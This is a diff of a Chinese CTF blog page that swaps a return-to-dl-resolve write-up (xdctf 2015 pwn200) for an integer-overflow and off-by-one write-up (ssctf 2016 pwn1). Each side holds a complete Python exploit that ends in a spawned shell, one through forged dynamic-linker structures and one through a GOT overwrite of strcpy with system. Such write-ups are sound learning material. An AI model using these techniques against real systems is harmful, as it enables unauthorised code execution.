@@ -68,7 +68,7 @@
 <link href="/css/main.css?v=5.0.1" rel="stylesheet" type="text/css" />
 
 
-  <meta name="keywords" content="Pwnable,return-to-dl-resolve,x86,练习," />
+  <meta name="keywords" content="Pwnable,integer-overflow,off-by-one,return-to-libc,x86,练习," />
 
 
 
@@ -85,40 +85,36 @@
 
 
 <meta name="description" content="Environment
-LocalLibc  : libc6_2.19-0ubuntu6.6_i386
+LocalLibc  : libc6_2.19-0ubuntu6.6_amd64
 
-Conclusion之前看过@糖果师傅的文章，当时也照着文章做了一遍。今天心血来潮又自己独立试了一下。
-对于利用来说，其实只要在.bss段伪造三个结构即可，其分别对应.rel.plt，.dymsym，.dynstr中的结构体，这些段的地址可利用readelf查看，如下所示
+ConclusionBugs
+integer overflow
+off by one bug
 
-对于.rel.pl">
+很有意思的题目，只发现了off-by-one bug![/images/ssctf-qual-2016-pwn1/2.jpg]![/images/ssctf-qual-2016-pwn1/3.jp">
 <meta property="og:type" content="article">
-<meta property="og:title" content="xdctf-qual-2015-pwn200">
-<meta property="og:url" content="http://0byjwzsf.me/2016/08/17/xdctf-qual-2015-pwn200/index.html">
+<meta property="og:title" content="ssctf-qual-2016-pwn1">
+<meta property="og:url" content="http://0byjwzsf.me/2016/09/02/ssctf-qual-2016-pwn1/index.html">
 <meta property="og:site_name" content="Icemakr's Blog">
 <meta property="og:description" content="Environment
-LocalLibc  : libc6_2.19-0ubuntu6.6_i386
+LocalLibc  : libc6_2.19-0ubuntu6.6_amd64
 
-Conclusion之前看过@糖果师傅的文章，当时也照着文章做了一遍。今天心血来潮又自己独立试了一下。
-对于利用来说，其实只要在.bss段伪造三个结构即可，其分别对应.rel.plt，.dymsym，.dynstr中的结构体，这些段的地址可利用readelf查看，如下所示
+ConclusionBugs
+integer overflow
+off by one bug
 
-对于.rel.pl">
-<meta property="og:image" content="http://0byjwzsf.me/images/xdctf-qual-2015-pwn200/1.jpg">
-<meta property="og:image" content="http://0byjwzsf.me/images/xdctf-qual-2015-pwn200/2-1.jpg">
-<meta property="og:image" content="http://0byjwzsf.me/images/xdctf-qual-2015-pwn200/2-2.jpg">
-<meta property="og:image" content="http://0byjwzsf.me/images/xdctf-qual-2015-pwn200/3-1.jpg">
-<meta property="og:image" content="http://0byjwzsf.me/images/xdctf-qual-2015-pwn200/3-2.jpg">
-<meta property="og:image" content="http://0byjwzsf.me/images/xdctf-qual-2015-pwn200/4.jpg">
-<meta property="og:image" content="http://0byjwzsf.me/images/xdctf-qual-2015-pwn200/5.jpg">
-<meta property="og:updated_time" content="2016-08-24T07:48:44.000Z">
+很有意思的题目，只发现了off-by-one bug![/images/ssctf-qual-2016-pwn1/2.jpg]![/images/ssctf-qual-2016-pwn1/3.jp">
+<meta property="og:updated_time" content="2016-09-02T12:28:20.000Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="xdctf-qual-2015-pwn200">
+<meta name="twitter:title" content="ssctf-qual-2016-pwn1">
 <meta name="twitter:description" content="Environment
-LocalLibc  : libc6_2.19-0ubuntu6.6_i386
+LocalLibc  : libc6_2.19-0ubuntu6.6_amd64
 
-Conclusion之前看过@糖果师傅的文章，当时也照着文章做了一遍。今天心血来潮又自己独立试了一下。
-对于利用来说，其实只要在.bss段伪造三个结构即可，其分别对应.rel.plt，.dymsym，.dynstr中的结构体，这些段的地址可利用readelf查看，如下所示
+ConclusionBugs
+integer overflow
+off by one bug
 
-对于.rel.pl">
+很有意思的题目，只发现了off-by-one bug![/images/ssctf-qual-2016-pwn1/2.jpg]![/images/ssctf-qual-2016-pwn1/3.jp">
 
 
 
@@ -139,9 +135,9 @@ Conclusion之前看过@糖果师傅的文章，当时也照着文章做了一遍
 
 
 
-  <link rel="canonical" href="http://0byjwzsf.me/2016/08/17/xdctf-qual-2015-pwn200/"/>
+  <link rel="canonical" href="http://0byjwzsf.me/2016/09/02/ssctf-qual-2016-pwn1/"/>
 
-  <title> xdctf-qual-2015-pwn200 | Icemakr's Blog </title>
+  <title> ssctf-qual-2016-pwn1 | Icemakr's Blog </title>
 </head>
 
 <body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
@@ -321,7 +317,7 @@ Conclusion之前看过@糖果师傅的文章，当时也照着文章做了一遍
             
             
               
-                xdctf-qual-2015-pwn200
+                ssctf-qual-2016-pwn1
               
             
           </h1>
@@ -333,8 +329,8 @@ Conclusion之前看过@糖果师傅的文章，当时也照着文章做了一遍
               <i class="fa fa-calendar-o"></i>
             </span>
             <span class="post-meta-item-text">发表于</span>
-            <time itemprop="dateCreated" datetime="2016-08-17T00:00:00+08:00" content="2016-08-17">
-              2016-08-17
+            <time itemprop="dateCreated" datetime="2016-09-02T00:00:00+08:00" content="2016-09-02">
+              2016-09-02
             </time>
           </span>
 
@@ -363,8 +359,8 @@ Conclusion之前看过@糖果师傅的文章，当时也照着文章做了一遍
             
               <span class="post-comments-count">
                 &nbsp; | &nbsp;
-                <a href="/2016/08/17/xdctf-qual-2015-pwn200/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count ds-thread-count" data-thread-key="2016/08/17/xdctf-qual-2015-pwn200/" itemprop="commentsCount"></span>
+                <a href="/2016/09/02/ssctf-qual-2016-pwn1/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count ds-thread-count" data-thread-key="2016/09/02/ssctf-qual-2016-pwn1/" itemprop="commentsCount"></span>
                 </a>
               </span>
             
@@ -388,29 +384,23 @@ Conclusion之前看过@糖果师傅的文章，当时也照着文章做了一遍
 
       
         <h1 id="Environment">Environment</h1><blockquote>
-<p>Local<br>Libc  : libc6_2.19-0ubuntu6.6_i386</p>
+<p>Local<br>Libc  : libc6_2.19-0ubuntu6.6_amd64</p>
 </blockquote>
-<h1 id="Conclusion">Conclusion</h1><p>之前看过<a href="http://drops.wooyun.org/binary/14360" target="_blank" rel="external">@糖果师傅</a>的文章，当时也照着文章做了一遍。今天心血来潮又自己独立试了一下。</p>
-<p>对于利用来说，其实只要在<code>.bss段</code>伪造三个结构即可，其分别对应<code>.rel.plt</code>，<code>.dymsym</code>，<code>.dynstr</code>中的结构体，这些段的地址可利用readelf查看，如下所示</p>
-<p><img src="/images/xdctf-qual-2015-pwn200/1.jpg" alt=""></p>
-<p>对于<code>.rel.plt段</code></p>
-<p><img src="/images/xdctf-qual-2015-pwn200/2-1.jpg" alt=""></p>
-<p>可在<strong>gdb</strong>中查看，结构与上图对应</p>
-<p><img src="/images/xdctf-qual-2015-pwn200/2-2.jpg" alt=""></p>
-<p>对于<code>.dynsym段</code></p>
-<p><img src="/images/xdctf-qual-2015-pwn200/3-1.jpg" alt=""></p>
-<p>在<strong>gdb</strong>中查看，结果同样与上图对应</p>
-<p><img src="/images/xdctf-qual-2015-pwn200/3-2.jpg" alt=""></p>
-<p><code>.dynstr段</code></p>
-<p><img src="/images/xdctf-qual-2015-pwn200/4.jpg" alt=""></p>
-<p>dl-resolve会根据下图中<code>plt</code>红框所示部分作为<code>.rel.plt</code>中的偏移，去寻找对应的结构体</p>
-<p><img src="/images/xdctf-qual-2015-pwn200/5.jpg" alt=""></p>
-<p>然后根据偏移找到对应的结构体后，会以<code>info&gt;&gt;8 * 16</code>作为偏移，在<code>.dynsym</code>中寻找对应的结构体</p>
-<p>找到<code>.dynsym</code>中对应的结构体后，会根据其<code>st_name</code>成员作为偏移量，在<code>dynstr</code>中寻找对应的要解析的函数名字符串</p>
-<p>在写exp的时候，只要查看已有的这些结构，去修改其中的作为寻找待解析函数名字符串的一些偏移量即可</p>
-<p>另外，这些都是在32位上试的，64位会有不同，目前还没去试过。</p>
-<h1 id="Exploit">Exploit</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> zio <span class="keyword">import</span> *</span><br><span class="line">target  = <span class="string">'./c14595742a95ebf0944804d8853b834c'</span></span><br><span class="line">io      = zio(target, print_read = COLORED(RAW, <span class="string">'blue'</span>), print_write = COLORED(RAW, <span class="string">'green'</span>), timeout = <span class="number">10000</span>)</span><br><span class="line">io.gdb_hint([<span class="number">0x804839b</span>])</span><br><span class="line"></span><br><span class="line">io.read_line()</span><br><span class="line"></span><br><span class="line">plt_read    = <span class="number">0x08048390</span></span><br><span class="line">plt_resolve = <span class="number">0x0804839b</span></span><br><span class="line"></span><br><span class="line">leave_ret   = <span class="number">0x08048481</span></span><br><span class="line">pop_ebp_ret = <span class="number">0x08048453</span></span><br><span class="line">ppp_ret     = <span class="number">0x0804856c</span></span><br><span class="line"></span><br><span class="line">adr_stage   = <span class="number">0x0804a000</span> + <span class="number">0x800</span></span><br><span class="line"></span><br><span class="line">payload0  = <span class="string">'A'</span> * <span class="number">0x70</span></span><br><span class="line">payload0 += l32(plt_read)</span><br><span class="line">payload0 += l32(ppp_ret)</span><br><span class="line">payload0 += l32(<span class="number">0</span>)</span><br><span class="line">payload0 += l32(adr_stage)</span><br><span class="line">payload0 += l32(<span class="number">0x500</span>)</span><br><span class="line"></span><br><span class="line">payload0 += l32(pop_ebp_ret)</span><br><span class="line">payload0 += l32(adr_stage)</span><br><span class="line">payload0 += l32(leave_ret)</span><br><span class="line">payload0 += l32(plt_resolve)</span><br><span class="line"></span><br><span class="line">io.writeline(payload0)</span><br><span class="line"></span><br><span class="line">adr_rel_plt         = <span class="number">0x8048318</span></span><br><span class="line">adr_dyn_sym         = <span class="number">0x80481d8</span></span><br><span class="line">adr_dyn_str         = <span class="number">0x8048268</span></span><br><span class="line">adr_fake_rel_plt    = adr_stage + <span class="number">0x100</span></span><br><span class="line">adr_fake_dyn_sym    = adr_stage + <span class="number">0x208</span></span><br><span class="line">adr_fake_dyn_str    = adr_stage + <span class="number">0x300</span></span><br><span class="line">adr_shell           = adr_stage + <span class="number">0x400</span></span><br><span class="line"></span><br><span class="line">got_read        = <span class="number">0x804a004</span></span><br><span class="line"></span><br><span class="line">payload1  = <span class="string">'A'</span> * <span class="number">0x4</span></span><br><span class="line">payload1 += l32(plt_resolve)</span><br><span class="line">payload1 += l32(adr_fake_rel_plt - adr_rel_plt)</span><br><span class="line">payload1 += l32(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload1 += l32(adr_shell)</span><br><span class="line">payload1  = payload1.ljust(<span class="number">0x100</span>, <span class="string">'A'</span>)</span><br><span class="line">payload1 += l32(got_read)</span><br><span class="line">payload1 += l32((adr_fake_dyn_sym - adr_dyn_sym)/<span class="number">0x10</span>*<span class="number">0x100</span> + <span class="number">0x7</span>)</span><br><span class="line">payload1  = payload1.ljust(<span class="number">0x208</span>, <span class="string">'A'</span>)</span><br><span class="line">payload1 += l32(adr_fake_dyn_str - adr_dyn_str)</span><br><span class="line">payload1 += l32(<span class="number">0x0</span>)</span><br><span class="line">payload1 += l32(<span class="number">0x0</span>)</span><br><span class="line">payload1 += l32(<span class="number">0x12</span>)</span><br><span class="line">payload1  = payload1.ljust(<span class="number">0x300</span>, <span class="string">'A'</span>)</span><br><span class="line">payload1 += <span class="string">'system\x00'</span></span><br><span class="line">payload1  = payload1.ljust(<span class="number">0x400</span>, <span class="string">'A'</span>)</span><br><span class="line">payload1 += <span class="string">'/bin/sh\x00'</span></span><br><span class="line"></span><br><span class="line">io.writeline(payload1)</span><br><span class="line"></span><br><span class="line">io.interact()</span><br></pre></td></tr></table></figure>
-<h1 id="Reference">Reference</h1><p><a href="http://drops.wooyun.org/binary/14360" target="_blank" rel="external">http://drops.wooyun.org/binary/14360</a></p>
+<h1 id="Conclusion">Conclusion</h1><h2 id="Bugs">Bugs</h2><ul>
+<li>integer overflow</li>
+<li>off by one bug</li>
+</ul>
+<p>很有意思的题目，只发现了<em>off-by-one bug</em><br>![/images/ssctf-qual-2016-pwn1/2.jpg]<br>![/images/ssctf-qual-2016-pwn1/3.jpg]</p>
+<p>可以利用这个bug泄露堆的地址，并伪造结构的size</p>
+<p>没有找到reload的时候还有整数溢出，后来是参考了google上找到的writeup<a href="http://uaf.io/exploitation/2016/02/28/SSCTF-PWN-400.html" target="_blank" rel="external">[1]</a>，利用这个漏洞可以绕过如下所示的分配内存时的大小检查</p>
+<p>![/images/ssctf-qual-2016-pwn1/1.jpg]</p>
+<p>从而分配到一块size为<em>0x4000000</em>的结构，然后利用update函数实现任意地址读写，可以覆盖<code>got@strcpy</code></p>
+<p>不过这里遇到了一个疑惑，<code>memcpy</code>和<code>strcpy</code>的实际加载地址和libc中查找到的偏移不符，后来找到了这篇文章<a href="https://infosecguerrilla.wordpress.com/2016/07/28/glibc-strange-behavior/" target="_blank" rel="external">[2]</a>，关于gcc实现的<strong><em>indirect function</em></strong></p>
+<h1 id="Exploit">Exploit</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> zio <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"></span><br><span class="line">target  = <span class="string">'./pwn1-fb39ccfa'</span></span><br><span class="line">io      = zio(target, print_read = <span class="keyword">False</span>, print_write = <span class="keyword">False</span>, timeout = <span class="number">1000</span>)</span><br><span class="line"></span><br><span class="line">io.hint([<span class="number">0x804959f</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x40000000 &lt;&lt; 2 + 1 = 0x4 (integer overflow !</span></span><br><span class="line">io.wls_af(<span class="string">'_CMD_$'</span>, [<span class="string">'sort'</span>, <span class="string">'1'</span>, str(<span class="number">0x40000000</span>)])</span><br><span class="line"></span><br><span class="line"><span class="comment"># sort</span></span><br><span class="line">io.wl_af(<span class="string">'Choose:'</span>, <span class="string">'3'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># off-by-one leak</span></span><br><span class="line">io.wls_af(<span class="string">'Choose:'</span>, [<span class="string">'1'</span>, <span class="string">'1'</span>])</span><br><span class="line">io.rtl(<span class="string">'[*L*] Query result: '</span>)</span><br><span class="line">heap_base = int(io.rl()[<span class="number">0</span>:-<span class="number">1</span>]) - <span class="number">0x38</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+] heap base : '</span> + hex(heap_base)</span><br><span class="line"></span><br><span class="line"><span class="comment"># off-by-one write</span></span><br><span class="line">io.wls_af(<span class="string">'Choose:'</span>, [<span class="string">'2'</span>, <span class="string">'1'</span>, str(heap_base + <span class="number">0x3c</span>)])</span><br><span class="line">io.wl_af(<span class="string">'Choose:'</span>, <span class="string">'7'</span>)</span><br><span class="line"></span><br><span class="line">io.wls_af(<span class="string">'_CMD_$'</span>, [<span class="string">'reload'</span>, <span class="string">'0'</span>])</span><br><span class="line"></span><br><span class="line">got_strcpy  = <span class="number">0x0804d03c</span></span><br><span class="line">idx  = str((got_strcpy + <span class="number">0x100000000</span> - (heap_base + <span class="number">0x4c</span>)) / <span class="number">4</span>)</span><br><span class="line">io.wls_af(<span class="string">'Choose:'</span>, [<span class="string">'1'</span>, idx])</span><br><span class="line">io.rtl(<span class="string">'[*L*] Query result: '</span>)</span><br><span class="line"></span><br><span class="line">off_strcpy  = <span class="number">0x00139ad0</span>                        <span class="comment">#</span></span><br><span class="line">adr_strcpy  = ctypes.c_uint32(int(io.rl()[<span class="number">0</span>:-<span class="number">1</span>])).value</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+] strcpy\t: '</span> + hex(adr_strcpy)</span><br><span class="line">libc_base   = adr_strcpy - off_strcpy</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+] libc base\t: '</span> + hex(libc_base)</span><br><span class="line">off_system  = <span class="number">0x00040190</span>                        <span class="comment"># 0x0003bc90</span></span><br><span class="line">adr_system  = libc_base + off_system</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+] system\t: '</span> + hex(adr_system)</span><br><span class="line"></span><br><span class="line">val  = str(ctypes.c_int32(adr_system).value)</span><br><span class="line">io.wls_af(<span class="string">'Choose:'</span>, [<span class="string">'2'</span>, idx, val])</span><br><span class="line">io.wl(<span class="string">'7'</span>)</span><br><span class="line"></span><br><span class="line">io.wl_af(<span class="string">'_CMD_$'</span>, <span class="string">'sh'</span>)</span><br><span class="line"></span><br><span class="line">io.itr()</span><br></pre></td></tr></table></figure>
+<h1 id="Reference">Reference</h1><ol>
+<li><a href="http://uaf.io/exploitation/2016/02/28/SSCTF-PWN-400.html" target="_blank" rel="external">http://uaf.io/exploitation/2016/02/28/SSCTF-PWN-400.html</a></li>
+<li><a href="https://infosecguerrilla.wordpress.com/2016/07/28/glibc-strange-behavior/" target="_blank" rel="external">https://infosecguerrilla.wordpress.com/2016/07/28/glibc-strange-behavior/</a></li>
+</ol>
 
       
     </div>
@@ -435,7 +425,11 @@ Conclusion之前看过@糖果师傅的文章，当时也照着文章做了一遍
           
             <a href="/tags/Pwnable/" rel="tag">#Pwnable</a>
           
-            <a href="/tags/return-to-dl-resolve/" rel="tag">#return-to-dl-resolve</a>
+            <a href="/tags/integer-overflow/" rel="tag">#integer-overflow</a>
+          
+            <a href="/tags/off-by-one/" rel="tag">#off-by-one</a>
+          
+            <a href="/tags/return-to-libc/" rel="tag">#return-to-libc</a>
           
             <a href="/tags/x86/" rel="tag">#x86</a>
           
@@ -448,17 +442,13 @@ Conclusion之前看过@糖果师傅的文章，当时也照着文章做了一遍
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2016/08/17/xdctf-qual-2015-pwn300/" rel="next" title="xdctf-qual-2015-pwn300">
-                <i class="fa fa-chevron-left"></i> xdctf-qual-2015-pwn300
+              <a href="/2016/08/24/0ctf-qual-2015-freenote/" rel="next" title="0ctf-qual-2015-freenote">
+                <i class="fa fa-chevron-left"></i> 0ctf-qual-2015-freenote
               </a>
             
           </div>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2016/08/18/xdctf-qual-2015-pwn500/" rel="prev" title="xdctf-qual-2015-pwn500">
-                xdctf-qual-2015-pwn500 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -484,8 +474,8 @@ Conclusion之前看过@糖果师傅的文章，当时也照着文章做了一遍
           
   <div class="comments" id="comments">
     
-      <div class="ds-thread" data-thread-key="2016/08/17/xdctf-qual-2015-pwn200/"
-           data-title="xdctf-qual-2015-pwn200" data-url="http://0byjwzsf.me/2016/08/17/xdctf-qual-2015-pwn200/">
+      <div class="ds-thread" data-thread-key="2016/09/02/ssctf-qual-2016-pwn1/"
+           data-title="ssctf-qual-2016-pwn1" data-url="http://0byjwzsf.me/2016/09/02/ssctf-qual-2016-pwn1/">
       </div>
     
   </div>
@@ -587,7 +577,7 @@ Conclusion之前看过@糖果师傅的文章，当时也照着文章做了一遍
               
             
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Environment"><span class="nav-number">1.</span> <span class="nav-text">Environment</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Conclusion"><span class="nav-number">2.</span> <span class="nav-text">Conclusion</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Exploit"><span class="nav-number">3.</span> <span class="nav-text">Exploit</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Reference"><span class="nav-number">4.</span> <span class="nav-text">Reference</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Environment"><span class="nav-number">1.</span> <span class="nav-text">Environment</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Conclusion"><span class="nav-number">2.</span> <span class="nav-text">Conclusion</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Bugs"><span class="nav-number">2.1.</span> <span class="nav-text">Bugs</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Exploit"><span class="nav-number">3.</span> <span class="nav-text">Exploit</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Reference"><span class="nav-number">4.</span> <span class="nav-text">Reference</span></a></li></ol></div>
             
           </div>
         </section>
